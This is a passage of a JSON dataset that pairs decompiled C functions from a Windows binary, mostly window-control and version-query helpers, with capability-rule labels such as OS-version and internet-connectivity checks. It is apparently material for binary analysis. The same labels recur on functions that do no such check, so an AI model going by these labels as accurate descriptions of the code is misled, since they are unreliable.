0;\n    uVar3 = fcn.00431b02(arg_8h_00, 0x49f9f8);\n    *(unaff_EBP + -0x4c) = uVar3;\n    iVar2 = (**(*arg_8h_00 + 0x3c))(arg_8h_00, unaff_EBP + -0x20);\n    if (iVar2 != 0) {\n        *(unaff_EBP + -0x20) = *0x49f9b8;\n        *(unaff_EBP + -0x1c) = *0x49f9bc;\n        *(unaff_EBP + -0x18) = *0x49f9c0;\n        *(unaff_EBP + -0x14) = *0x49f9c4;\n    }\n    (**(*arg_8h_00 + 0x40))(arg_8h_00, 1, unaff_EBP + -0x28);\n    if (*(unaff_EBP + -0x3c) == 0) {\n        if (*(unaff_EBP + -0x2c) == 0) {\n            iVar2 = (**(*arg_8h_00 + 0x20))(arg_8h_00, 4, 3, unaff_EBP + -0x44);\n            if (iVar2 == 0) {\n                (*_sym.imp.ole32.dll_CreateBindCtx)(0, unaff_EBP + -0x40);\n                (**(**(unaff_EBP + -0x44) + 0x50))(*(unaff_EBP + -0x44), *(unaff_EBP + -0x40), 0, unaff_EBP + -0x2c);\n                fcn.00431b26(unaff_EBP + -0x40);\n                goto code_r0x0041437a;\n            }\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x28) != 0) {\n            uVar3 = fcn.0042407a();\n            fcn.004136d8(uVar3);\n            *(unaff_EBP + -4) = 0;\n            fcn.00413f5d(0xf094);\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*(unaff_EBP + -0x28));\n            iVar2 = *(*(unaff_EBP + -0x24) + -0xc) + 1 + iVar2;\n            iVar4 = fcn.004130f7(iVar2, 2);\n            *(unaff_EBP + -0x3c) = iVar4;\n            if (iVar4 != 0) {\n                puVar5 = fcn.00462f86();\n                *(unaff_EBP + -0x54) = *puVar5;\n                puVar5 = fcn.00462f86();\n                *puVar5 = 0;\n                uVar3 = *(unaff_EBP + -0x3c);\n                fcn.00462e68(uVar3, iVar2, iVar2 + -1, *(unaff_EBP + -0x24), *(unaff_EBP + -0x28));\n                piVar6 = fcn.00462f86();\n                if (*piVar6 == 0) {\n                    puVar5 = fcn.00462f86();\n                    *puVar5 = *(unaff_EBP + -0x54);\n                }\n                else {\n                    puVar5 = fcn.00462f86();\n                    fcn.0041367c(*puVar5);\n                }\n                (*_sym.imp.ole32.dll_CoTaskMemFree)(*(unaff_EBP + -0x28));\n                *(unaff_EBP + -0x28) = uVar3;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00402740();\n        }\n        (**(**(unaff_EBP + -0x48) + 0x20))(*(unaff_EBP + -0x48), unaff_EBP + -0x2c);\ncode_r0x0041437a:\n        *(unaff_EBP + -0x24) = 1;\n    }\n    puVar5 = *(unaff_EBP + -0x50);\n    if (puVar5 == NULL) {\n        piVar6 = *(unaff_EBP + -0x4c);\n        if (piVar6 != NULL) {\n            iVar2 = (**(*piVar6 + 0x24))(piVar6, *(unaff_EBP + 0x10), 0xffffffff, 0, unaff_EBP + -0x34);\n            if (iVar2 == 0) goto code_r0x004143b2;\n        }\n        *(unaff_EBP + -0x34) = 0;\n        *(unaff_EBP + -0x30) = 0;\n    }\n    else {\n        uVar3 = puVar5[1];\n        *(unaff_EBP + -0x34) = *puVar5;\n        *(unaff_EBP + -0x30) = uVar3;\n    }\ncode_r0x004143b2:\n    iVar2 = (**(*arg_8h_00 + 0x58))(arg_8h_00, *(unaff_EBP + 0x10), unaff_EBP + -0x38);\n    if (iVar2 != 0) {\n        *(unaff_EBP + -0x38) = 0;\n    }\n    fcn.0041336c(*(unaff_EBP + -0x20), *(unaff_EBP + -0x1c), *(unaff_EBP + -0x18), *(unaff_EBP + -0x14), \n                 *(unaff_EBP + 0x10), *(unaff_EBP + -0x34), *(unaff_EBP + -0x30), *(unaff_EBP + 0x14), \n                 *(unaff_EBP + 0x18), *(unaff_EBP + -0x38), *(unaff_EBP + -0x28), *(unaff_EBP + -0x2c));\n    pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n    (*_sym.imp.ole32.dll_CoTaskMemFree)(*(unaff_EBP + -0x28));\n    if (*(unaff_EBP + -0x24) != 0) {\n        (*pcVar1)(*(unaff_EBP + -0x2c));\n    }\n    fcn.00431b26(unaff_EBP + -0x44);\n    fcn.00431b26(unaff_EBP + -0x48);\n    fcn.00431b26(unaff_EBP + -0x4c);\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 2187
    },
    "00414470": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00414470(uint arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uchar *arg_8h_00;\n    int32_t *piVar5;\n    int32_t arg_8h_01;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00462818();\n    (**0x4b94e8)();\n    iVar6 = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    puVar1 = *(unaff_EBP + 8);\n    uVar3 = *puVar1;\n    *(unaff_EBP + -4) = 0;\n    if (uVar3 == 0) {\n        arg_8h_01 = 0;\n    }\n    else {\n        arg_8h_01 = uVar3 + puVar1;\n    }\n    if (puVar1[1] == 0) {\n        iVar7 = 0;\n    }\n    else {\n        iVar7 = puVar1[1] + puVar1;\n    }\n    if (puVar1[2] != 0) {\n        iVar6 = puVar1[2] + puVar1;\n    }\n    fcn.0041442c(arg_8h_01);\n    *(unaff_EBP + -4) = 1;\n    fcn.0041442c(iVar7);\n    arg_8h_00 = &stack0xfffffff0;\n    *(unaff_EBP + -4) = 2;\n    fcn.0041442c(iVar6);\n    *(unaff_EBP + -4) = 3;\n    if (arg_8h_01 == 0) {\n        *(unaff_EBP + -0x18) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x18) = *(*(unaff_EBP + -0x24) + -0xc) * 2 + 2;\n    }\n    if (iVar7 == 0) {\n        *(unaff_EBP + -0x14) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x14) = *(*(unaff_EBP + -0x28) + -0xc) * 2 + 2;\n    }\n    if (iVar6 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x1c) = *(*(unaff_EBP + -0x20) + -0xc) * 2 + 2;\n    }\n    iVar6 = *(unaff_EBP + 0xc);\n    if (iVar6 != 0) {\n        uVar4 = *(iVar6 + 0x26) + 0xdc;\n        if (uVar4 < 0x401) {\n            cVar2 = fcn.00401120(uVar4);\n            if (cVar2 == '\\0') goto code_r0x0041455d;\n            fcn.00462d70();\n        }\n        else {\ncode_r0x0041455d:\n            arg_8h_00 = fcn.00402070(*(iVar6 + 0x26) + 0xdc);\n        }\n        arg_8h_01 = fcn.00413500(arg_8h_00, iVar6);\n        if (arg_8h_01 != 0) goto code_r0x00414583;\n    }\n    fcn.00411e42();\ncode_r0x00414583:\n    iVar6 = *(arg_8h_01 + 0x46) + *(arg_8h_01 + 0x44) + *(unaff_EBP + -0x1c) + *(unaff_EBP + -0x14) + 0x10 +\n            *(unaff_EBP + -0x18);\n    piVar5 = (*_sym.imp.ole32.dll_CoTaskMemAlloc)(iVar6);\n    if (piVar5 != NULL) {\n        iVar7 = *(unaff_EBP + -0x18);\n        *piVar5 = iVar6;\n        *(piVar5 + 1) = 0x10;\n        if (0 < iVar7) {\n            fcn.004012c0(piVar5 + 4, *(*(unaff_EBP + -0x24) + -0xc) + 1, *(unaff_EBP + -0x24));\n        }\n        uVar3 = *(piVar5 + 1) + *(unaff_EBP + -0x18);\n        iVar7 = *(unaff_EBP + -0x14);\n        *(piVar5 + 6) = uVar3;\n        if (0 < iVar7) {\n            fcn.004012c0(uVar3 + piVar5, *(*(unaff_EBP + -0x28) + -0xc) + 1, *(unaff_EBP + -0x28));\n        }\n        uVar3 = *(piVar5 + 6) + *(unaff_EBP + -0x14);\n        iVar7 = *(unaff_EBP + -0x1c);\n        *(piVar5 + 2) = uVar3;\n        if (iVar7 != 0) {\n            fcn.004012c0(uVar3 + piVar5, *(*(unaff_EBP + -0x20) + -0xc) + 1, *(unaff_EBP + -0x20));\n        }\n        uVar3 = *(piVar5 + 2) + *(unaff_EBP + -0x1c);\n        *(piVar5 + 10) = uVar3;\n        fcn.0041314e(uVar3 + piVar5, iVar6 - uVar3, arg_8h_01, *(arg_8h_01 + 0x46) + 0xdc);\n    }\n    fcn.00402740();\n    fcn.00402740();\n    fcn.00402740();\n    fcn.004020b0();\n    *(unaff_EBP + -0x40) = 0x41467c;\n    fcn.0046289b();\n    return;\n}\n",
        "token_count": 1584
    },
    "004146d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004146d0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    fcn.0041bcf0(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        iVar2 = fcn.0041bc6f(iVar1);\n        if (iVar2 == 0) {\n            fcn.00411e28();\n        }\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = iVar1;\n    return arg_8h;\n}\n",
        "token_count": 160
    },
    "0041470f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041470f(int32_t *param_1)\n\n{\n    int32_t *hWnd;\n    \n    hWnd = param_1;\n    if ((*param_1 != 0) && (param_1[2] != 0)) {\n        fcn.0041bcf0(param_1[2], &hWnd);\n        if (hWnd != NULL) {\n            (*_sym.imp.USER32.dll_SetFocus)(hWnd);\n            if (param_1[3] != 0) {\n                (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0xb1, 0, 0xffffffff);\n            }\n        }\n    }\n    fcn.0042d805();\n    return;\n}\n",
        "token_count": 161
    },
    "0041475e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041475e(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = arg_8h;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &arg_8h);\n    if (*piVar1 == 0) {\n        if ((*arg_10h < 0) || (2 < *arg_10h)) {\n            *arg_10h = 0;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0xf1, *arg_10h, 0);\n    }\n    else {\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0xf0, 0, 0);\n        *arg_10h = iVar2;\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00414914": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414914(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    \n    piVar1 = arg_8h;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &arg_8h);\n    if (*piVar1 == 0) {\n        (*_sym.imp.USER32.dll_SetScrollPos)(arg_8h, 2, *arg_10h, 1);\n    }\n    else {\n        uVar2 = (*_sym.imp.USER32.dll_GetScrollPos)(arg_8h, 2);\n        *arg_10h = uVar2;\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00414a03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414a03(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = arg_14h;\n    uVar2 = arg_10h;\n    if ((*arg_8h != 0) || ((arg_10h <= arg_ch && (arg_ch <= arg_14h)))) {\n        fcn.0041bcf0(arg_8h[2], &arg_ch);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_ch, 0x407, 0, uVar2);\n        (*pcVar1)(arg_ch, 0x408, 1, uVar3);\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "00414a55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414a55(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_10h;\n    if (*(arg_10h + 0x20) != 0) {\n        return;\n    }\n    iVar1 = fcn.0041bc4d();\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &arg_10h);\n    if (arg_10h != 0) {\n        iVar1 = fcn.00419592(arg_10h);\n        if (iVar1 == 0) {\n            fcn.00411e28();\n        }\n        if (arg_10h != 0) {\n            iVar1 = *(arg_8h + 4);\n            iVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x20));\n            if (*(iVar1 + 0x20) == iVar2) {\n                return;\n            }\n            arg_ch = 0;\n            goto code_r0x00414ad0;\n        }\n    }\n    iVar2 = fcn.0041bc6f(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar1 = *(arg_8h + 4);\ncode_r0x00414ad0:\n    fcn.0041c09b(iVar1, arg_ch);\n    return;\n}\n",
        "token_count": 347
    },
    "00414af5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414af5(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint unaff_EDI;\n    uint var_48h;\n    uint lpString;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_8h_00 = fcn.00414ade(arg_ch);\n    uVar1 = arg_18h;\n    if (*arg_8h == 0) {\n        puVar3 = fcn.00462f86();\n        uVar1 = *puVar3;\n        puVar3 = fcn.00462f86();\n        *puVar3 = 0;\n        fcn.00463313(&lpString, 0x40, 0x3f, arg_10h, &arg_18h);\n        piVar4 = fcn.00462f86();\n        if (*piVar4 == 0) {\n            puVar3 = fcn.00462f86();\n            *puVar3 = uVar1;\n        }\n        else {\n            puVar3 = fcn.00462f86();\n            fcn.0041367c(*puVar3);\n        }\n        fcn.0043042c(arg_8h_00, &lpString);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h_00, &lpString, 0x40);\n        iVar2 = fcn.00463424(&lpString, 0x40, arg_10h, uVar1);\n        if (iVar2 != 1) {\n            fcn.00426289(arg_14h, 0, 0xffffffff);\n            fcn.0041470f();\n        }\n    }\n    fcn.0045e747(unaff_EDI);\n    return;\n}\n",
        "token_count": 466
    },
    "00414bb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414bb8(int32_t *arg_8h, uint arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t *puVar1;\n    \n    puVar1 = arg_10h;\n    arg_10h = *arg_10h;\n    if (*arg_8h == 0) {\n        fcn.00414af5(arg_8h, arg_ch, 0x492f48, 0xf116, arg_10h);\n    }\n    else {\n        fcn.00414af5(arg_8h, arg_ch, 0x492f48, 0xf116, &arg_10h);\n        if (0xff < arg_10h) {\n            fcn.00426289(0xf116, 0, 0xffffffff);\n            fcn.0041470f();\n        }\n        *puVar1 = arg_10h;\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00414c29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414c29(int32_t *arg_8h, uint arg_ch, int16_t *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00414af5(arg_8h, arg_ch, 0x492f4c, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 98
    },
    "00414c5a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414c5a(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00414af5(arg_8h, arg_ch, 0x492f50, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 96
    },
    "00414c89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414c89(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00414af5(arg_8h, arg_ch, 0x492f48, 0xf117, arg_10h);\n    return;\n}\n",
        "token_count": 95
    },
    "00414cb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414cb8(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00414af5(arg_8h, arg_ch, 0x492f54, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 95
    },
    "00414ce7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414ce7(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00414af5(arg_8h, arg_ch, 0x492f58, 0xf117, arg_10h);\n    return;\n}\n",
        "token_count": 95
    },
    "00414d16": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414d16(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        fcn.00414af5(arg_8h, arg_ch, \"%I64d\", 0xf110, *arg_10h);\n    }\n    else {\n        fcn.00414af5(arg_8h, arg_ch, \"%I64d\", 0xf110, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00414d5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414d5e(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        fcn.00414af5(arg_8h, arg_ch, \"%I64u\", 0xf117, *arg_10h);\n    }\n    else {\n        fcn.00414af5(arg_8h, arg_ch, \"%I64u\", 0xf117, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00414da6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414da6(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00414ade(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.0043042c(arg_8h_00, arg_10h);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextLengthA)(arg_8h_00);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h_00, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00415282": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415282(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h_00 = fcn.00414ade(arg_ch);\n    if (*arg_8h == 0) {\n        fcn.0043042c(arg_8h_00, *arg_10h);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(arg_8h_00);\n        uVar2 = fcn.00415261(iVar1, iVar1 + 1);\n        (*_sym.imp.USER32.dll_GetWindowTextA)(arg_8h_00, uVar2);\n        fcn.00414de4(0xffffffff);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00415368": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415368(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *hWnd;\n    int32_t iVar2;\n    \n    hWnd = arg_8h;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &arg_8h);\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*hWnd == 0) {\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x1a2, 0xffffffff, *arg_10h);\n        if (-1 < iVar2) {\n            (*pcVar1)(arg_8h, 0x186, iVar2, 0);\n        }\n    }\n    else {\n        fcn.004152d4(hWnd, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "0041545a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041545a(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *hWnd;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    hWnd = arg_8h;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &arg_8h);\n    puVar2 = arg_10h;\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*hWnd == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x158, 0xffffffff, *arg_10h);\n        if (iVar3 < 0) {\n            fcn.0043042c(arg_8h, *puVar2);\n        }\n        else {\n            (*pcVar1)(arg_8h, 0x14e, iVar3, 0);\n        }\n    }\n    else {\n        fcn.004153c8(hWnd, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "004154dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004154dc(void)\n\n{\n    uint *arg_8h;\n    uint lpVersionInformation;\n    uint var_94h;\n    uint var_88h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    fcn.00462290(&var_94h, 0, 0x90);\n    arg_8h = &lpVersionInformation;\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 142
    },
    "00415671": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415671(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.00415534();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        if (((arg_10h & 3) == 0) &&\n           ((((arg_8h < 0 || (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0),  iVar2 <= arg_8h)) || (arg_ch < 0)) ||\n            (iVar2 = (*pcVar1)(1),  iVar2 <= arg_ch)))) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = 0x12340042;\n        }\n    }\n    else {\n        uVar3 = (**0x4bb05c)(arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
        "token_count": 238
    },
    "00415902": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415902(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00415534();\n    if (iVar1 == 0) {\n        if ((arg_8h == 0) && (arg_ch == 0)) {\n            if ((arg_10h == NULL) || (*arg_10h < 0x1a8)) {\n                uVar2 = 0;\n            }\n            else {\n                fcn.004635fb(arg_10h + 1, 0x20, \"DISPLAY\", 0x1f);\n                fcn.004635fb(arg_10h + 9, 0x80, \"DISPLAY\", 0x1f);\n                arg_10h[0x29] = 5;\n                uVar2 = 1;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n        return uVar2;\n    }\n    // WARNING: Could not recover jumptable at 0x0041590f. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar2 = (**0x4bb068)();\n    return uVar2;\n}\n",
        "token_count": 285
    },
    "00415974": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
